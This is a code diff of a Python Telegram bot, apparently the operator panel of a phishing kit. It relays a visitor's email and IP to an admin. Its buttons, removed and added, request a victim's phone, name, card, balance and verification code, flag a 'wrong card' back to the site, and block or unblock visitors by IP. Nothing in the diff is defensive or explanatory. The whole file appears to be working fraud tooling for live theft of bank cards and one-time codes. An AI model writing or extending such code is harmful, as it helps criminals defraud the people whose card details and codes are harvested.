@@ -1027,26 +1027,13 @@ async def notify_admin(request):
         f"<b>mail:</b> <code>{mail}</code>\n"
         f"<b>ip:</b> <code>{ip}</code>"
     )
-    # Кнопки (inline keyboard)
+    # Нова клавіатура
     kb = InlineKeyboardMarkup(
         inline_keyboard=[
             [
-                InlineKeyboardButton(text="1. 📱 Телефон", callback_data="phone"),
-                InlineKeyboardButton(text="2. 📨 Ф.И.О", callback_data="fio"),
-            ],
-            [
-                InlineKeyboardButton(text="3. 📍 Карта", callback_data="card"),
-                InlineKeyboardButton(text="4. ⚖️ Баланс", callback_data="balance"),
-                InlineKeyboardButton(text="5. 📨 Код", callback_data="code"),
-            ],
-            [
-                InlineKeyboardButton(text="❌ Код", callback_data="cancel_code"),
-            ],
-            [
-                InlineKeyboardButton(text="👁️", callback_data="eye"),
-            ],
-            [
-                InlineKeyboardButton(text="🗑️ Заблокировать", callback_data="block"),
+                InlineKeyboardButton(text="Карта", callback_data=f"card:{ip}"),
+                InlineKeyboardButton(text="Заблокировать", callback_data=f"block:{ip}"),
+                InlineKeyboardButton(text="Розблокувати", callback_data=f"unblock:{ip}")
             ]
         ]
     )
@@ -1093,6 +1080,20 @@ async def code_request_again_handler(call: types.CallbackQuery):
     async with aiohttp_client.ClientSession() as session:
         await session.post('http://127.0.0.1:8080/set_request_again', json={'code': code})
     await call.answer("Request sent to user")
+
+# --- CALLBACK-ОБРОБНИКИ ДЛЯ КНОПОК ---
+@router.callback_query(lambda c: c.data and (c.data.startswith('card:') or c.data.startswith('block:') or c.data.startswith('unblock:')))
+async def admin_action_handler(call: types.CallbackQuery):
+    action, ip = call.data.split(':', 1)
+    import aiohttp as aiohttp_client
+    async with aiohttp_client.ClientSession() as session:
+        await session.post('http://127.0.0.1:8080/admin_action', json={'action': action, 'ip': ip})
+    if action == 'card':
+        await call.answer("Сигнал на сайт: не вірна карта")
+    elif action == 'block':
+        await call.answer("Користувач заблокований")
+    elif action == 'unblock':
+        await call.answer("Користувач розблокований")
 
 # --- запуск aiohttp і aiogram в одному event loop ---
 if __name__ == '__main__':
